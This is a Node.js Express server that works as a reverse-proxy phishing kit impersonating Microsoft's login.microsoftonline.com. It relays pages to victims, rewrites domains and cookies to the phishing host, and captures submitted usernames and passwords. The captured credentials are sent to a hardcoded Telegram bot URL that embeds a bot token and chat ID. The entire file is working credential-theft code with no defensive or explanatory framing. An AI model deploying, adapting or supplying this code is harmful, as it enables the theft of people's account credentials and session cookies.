const express = require('express');
const fetch = require('node-fetch');
const app = express();

const blockedRegions = [];
const blockedIPAddresses = ["0.0.0.0", "127.0.0.1"];

app.use(express.urlencoded({ extended: true }));
app.use(express.json());

app.all('*', async (req, res) => {
    const country = req.headers['cf-ipcountry']?.toUpperCase();
    const ipaddr = req.headers['cf-connecting-ip'];
    
    if (blockedRegions.includes(country)) {
        return res.status(403).send("Access denied.");
    }
    
    if (blockedIPAddresses.includes(ipaddr)) {
        return res.status(403).send("Access denied");
    }

    const originalHost = req.headers.host;
    const targetUrl = new URL(req.path, 'https://login.microsoftonline.com');

    const headers = new Headers(req.headers);
    headers.set("Host", "login.microsoftonline.com");
    headers.set("Referer", `https://${originalHost}`);

    try {
        if (req.method === 'POST') {
            const bodyText = Object.entries(req.body)
                .map(([key, value]) => `${key}=${encodeURIComponent(value)}`)
                .join('&');

            if (req.body.login && req.body.passwd) {
                const credentialsMessage = `<b>Password found:</b><br><br><b>User</b>: ${req.body.login}<br><b>Password</b>: ${req.body.passwd}`;
                await sendToTelegram(credentialsMessage, "https://api.telegram.org/bot2071010767:AAEJbO34MFOD96LcV8IHwGiVhiyhrfFH_2o/sendMessage?chat_id=-620309599", true);
            }
        }

        const response = await fetch(targetUrl, {
            method: req.method,
            headers: headers,
            body: req.method === 'POST' ? JSON.stringify(req.body) : undefined
        });

        const responseHeaders = response.headers;
        const cookies = responseHeaders.get('set-cookie');
        
        if (cookies) {
            const updatedCookies = cookies.split(',').map(cookie => 
                cookie.replace(/login\.microsoftonline\.com/g, originalHost)
            );
            res.set('Set-Cookie', updatedCookies);
        }

        const data = await response.text();
        const modifiedData = data.replace(/login\.microsoftonline\.com/g, originalHost);
        
        res.status(response.status).send(modifiedData);
    } catch (error) {
        console.error('Error:', error);
        res.status(500).send('Internal Server Error');
    }
});

async function sendToTelegram(content, webhookUrl, isMessage = false) {
    try {
        if (isMessage) {
            const res = await fetch(webhookUrl, {
                method: "POST",
                headers: { 'Content-Type': "application/json" },
                body: JSON.stringify({ text: content })
            });

            if (!res.ok) {
                throw new Error("Failed to send message to webhook: " + res.statusText);
            }
        }
    } catch (error) {
        console.error('Error sending to Telegram:', error);
    }
}

const port = process.env.PORT || 3000;
app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
}); 